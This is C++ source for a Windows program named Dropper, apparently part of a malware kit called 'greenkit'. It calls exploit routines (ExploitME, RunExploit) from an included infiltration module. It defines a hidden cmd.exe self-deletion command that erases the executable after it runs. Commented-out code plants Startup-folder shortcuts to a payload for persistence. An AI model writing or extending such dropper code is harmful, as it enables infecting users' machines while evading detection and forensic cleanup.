// Dropper.cpp : Defines the entry point for the application.
//

#include "stdafx.h"
#include "Dropper.h"
#include "Infiltration.h"
#include <strsafe.h>

#define SELF_REMOVE_STRING  TEXT("cmd.exe /C ping 1.1.1.1 -n 1 -w 3000 > Nul & Del \"%s\"")

#define MAX_LOADSTRING 100

// Global Variables:
HINSTANCE hInst;								// current instance
TCHAR szTitle[MAX_LOADSTRING];					// The title bar text
TCHAR szWindowClass[MAX_LOADSTRING];			// the main window class name

// Forward declarations of functions included in this code module:
ATOM				MyRegisterClass(HINSTANCE hInstance);
BOOL				InitInstance(HINSTANCE, int);
LRESULT CALLBACK	WndProc(HWND, UINT, WPARAM, LPARAM);
INT_PTR CALLBACK	About(HWND, UINT, WPARAM, LPARAM);

void DelMe()
{
    TCHAR szModuleName[MAX_PATH];
    TCHAR szCmd[2 * MAX_PATH];
    STARTUPINFO si = { 0 };
    PROCESS_INFORMATION pi = { 0 };

    GetModuleFileName(NULL, szModuleName, MAX_PATH);

    StringCbPrintf(szCmd, 2 * MAX_PATH, SELF_REMOVE_STRING, szModuleName);

    CreateProcess(NULL, szCmd, NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    CloseHandle(pi.hThread);
    CloseHandle(pi.hProcess);
}

int APIENTRY _tWinMain(_In_ HINSTANCE hInstance,
                     _In_opt_ HINSTANCE hPrevInstance,
                     _In_ LPTSTR    lpCmdLine,
                     _In_ int       nCmdShow)
{
	UNREFERENCED_PARAMETER(hPrevInstance);
	UNREFERENCED_PARAMETER(lpCmdLine);

 	// TODO: Place code here.
	//%userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\_greenkit_GreentKitExe.lnk");

	ExploitME();
	Sleep(1000);
	//wchar_t pathobj[MAX_PATH];
	//mbstowcs(pathobj, "%userprofile%\\Documents\\HAHA.txt", MAX_PATH);//"%userprofile%\\Documents\\_greenkit_folder\\_greenkit_GreenKitExe.exe", MAX_PATH);
	//CreateLink(pathobj, "C:\\yolo.lnk", NULL);
	//CreateDesktopShortcut("yolo", "%userprofile%\\Documents\\HAHA.txt");//"%userprofile%\\Documents\\_greenkit_folder\\_greenkit_GreenKitExe.exe");
	//create_shortcut("%userprofile%\\Documents\\HAHA.txt", "%userprofile%\\Documents\\coucou.lnk");
	Sleep(1000);
	RunExploit();
    DelMe();
	return 0;
}

